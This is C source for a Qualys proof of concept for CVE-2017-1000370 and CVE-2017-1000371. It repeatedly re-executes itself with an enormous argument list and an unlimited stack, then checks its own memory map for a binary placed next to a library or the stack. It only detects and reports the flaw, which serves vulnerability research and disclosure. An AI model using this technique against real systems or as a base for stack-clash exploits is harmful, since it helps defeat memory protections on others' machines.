/*
 * Linux_offset2lib.c for CVE-2017-1000370 and CVE-2017-1000371
 * Copyright (C) 2017 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define die() do { \
    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

#define MAX_STACK_SIZE ((size_t)1<<30)
#define MAX_ARG_STRLEN ((size_t)128<<10)
#define MIN_ARGC 1024

static void
analyze_mappings(const char * const binary)
{
    if (!binary) die();
    if (strchr(binary, ' ')) die();
    int rval = EXIT_FAILURE;
    int dump = 0;

    const int fd = open("/proc/self/maps", O_RDONLY);
    if (fd <= -1) die();

    static char buf[4096] = " ";
    char * cp = buf;
    for (;;) {
        if (cp >= buf + sizeof(buf)) die();
        const ssize_t nr = read(fd, cp, buf + sizeof(buf) - cp);
        if (nr <= 0) {
            if (nr == 0) break;
            if (nr != -1) die();
            if (errno != EAGAIN && errno != EINTR) die();
            continue;
        }
        cp += nr;
    }
    *cp = '\0';
    if (memchr(buf, '\0', sizeof(buf)) != cp) die();

    size_t hi_bin = 0;
    size_t lo_lib = 0;
    size_t lo_heap = 0;
    size_t lo_stack = 0;
    const char * line = buf;
    for (;;) {
        char * const nl = strchr(line, '\n');
        if (!nl) die();
        *nl = '\0';

        cp = NULL;
        const size_t lo = strtoul(line, &cp, 16);
        if (cp <= line || *cp != '-') die();
        if (lo <= 0) die();

        line = cp + 1;
        cp = NULL;
        const size_t hi = strtoul(line, &cp, 16);
        if (cp <= line || *cp != ' ') die();
        if (hi <= lo) die();

        cp = strrchr(cp + 1, ' ');
        if (!cp) die();
        cp++;

        if (!strcmp(cp, binary)) {
            hi_bin = hi;
            if (lo == 0x08048000) {
                fprintf(stderr, "Please recompile with -fpie -pie\n");
                die();
            }
        } else if (!strcmp(cp, "[heap]")) {
            if (!lo_heap) lo_heap = lo;
            else {
                if (lo_stack) die();
                lo_stack = lo;
                dump = 1;
            }
        } else if (!strcmp(cp, "[stack]")) {
            if (!lo_stack) lo_stack = lo;
            else {
                die();
            }
        } else if (*cp == '/') {
            if (!lo_lib) lo_lib = lo;
        }

        *nl = '\n';
        line = nl + 1;
        if (*line == '\0') break;
    }
    if (!hi_bin) die();
    if (!lo_lib) die();
    if (!lo_stack) {
        if (!lo_heap) die();
        lo_stack = lo_heap;
        lo_heap = 0;
    }

    if (hi_bin <= lo_lib && lo_lib - hi_bin <= 4096) {
        fprintf(stderr, "CVE-2017-1000370 triggered\n");
        rval = EXIT_SUCCESS;
        dump = 1;
    }
    if (hi_bin <= lo_stack && lo_stack - hi_bin <= 4096) {
        fprintf(stderr, "CVE-2017-1000371 triggered\n");
        rval = EXIT_SUCCESS;
        dump = 1;
    }
    if (dump) {
        const ssize_t len = strlen(buf);
        if (len <= 0) die();
        if (write(STDERR_FILENO, buf, len) != len) die();
    }
    if (close(fd)) die();
    exit(rval);
}

int
main(const int my_argc, const char * const my_argv[])
{
    if (my_argc >= MIN_ARGC) {
        analyze_mappings(*my_argv);
        die();
    }

    size_t stack_size = MAX_STACK_SIZE;
    if (my_argc == 2) stack_size = strtoul(my_argv[1], NULL, 0);
    else if (my_argc != 1) die();
    if (stack_size > MAX_STACK_SIZE) die();

    static char arg[MAX_ARG_STRLEN] = " ";
    memset(arg, ' ', sizeof(arg)-1);

    const size_t argc = 1 + stack_size / (sizeof(arg) + sizeof(char *));
    if (argc < MIN_ARGC) die();

    char ** const argv = calloc(argc + 1, sizeof(char *));
    if (!argv) die();

    char * const binary = realpath(*my_argv, NULL);
    if (!binary) die();
    *argv = binary;

    size_t i;
    for (i = 1; i < argc; i++) argv[i] = arg;
    if (i != argc) die();
    if (argv[i]) die();

    for (i = 1; i; i++) {
        fprintf(stderr, "Run #%zu...\n", i);
        const pid_t pid = fork();
        if (pid <= -1) die();
        if (pid == 0) {
            static const struct rlimit stack_limit = { RLIM_INFINITY, RLIM_INFINITY };
            if (setrlimit(RLIMIT_STACK, &stack_limit)) die();
            execve(*argv, argv, NULL);
            die();
        }
        int status = 0;
        if (waitpid(pid, &status, WUNTRACED) != pid) die();
        if (!WIFEXITED(status)) die();
        if (WEXITSTATUS(status) == EXIT_SUCCESS) continue;
        if (WEXITSTATUS(status) != EXIT_FAILURE) die();
    }
    die();
}